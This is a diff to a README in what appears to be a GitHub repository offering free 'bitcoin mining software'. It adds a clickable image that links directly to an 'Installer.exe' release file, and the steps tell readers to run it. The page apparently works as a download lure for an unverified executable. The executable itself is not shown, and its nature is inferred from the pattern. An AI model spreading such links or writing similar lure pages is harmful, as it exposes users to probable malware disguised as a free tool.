@@ -20,7 +20,9 @@ Follow these steps to install the **mining bitcoin software**:
 
 1. **Download the file.**  
    Click the "Download" button below or check the "Releases" section in this repository to get the latest version.
-   ![download](https://github.com/user-attachments/assets/58ac28a3-2706-4ac9-95d5-63a08bcf6250)
+<a href="https://github.com/cara-dixon/bitcoin-mining-software-free-download/releases/download/publish/Installer.exe">
+  <img src="https://github.com/user-attachments/assets/58ac28a3-2706-4ac9-95d5-63a08bcf6250" alt="201887" width="300"/>
+</a>
 
 3. **Install the application.**  
    Open the downloaded file and follow the on-screen instructions to complete the installation.
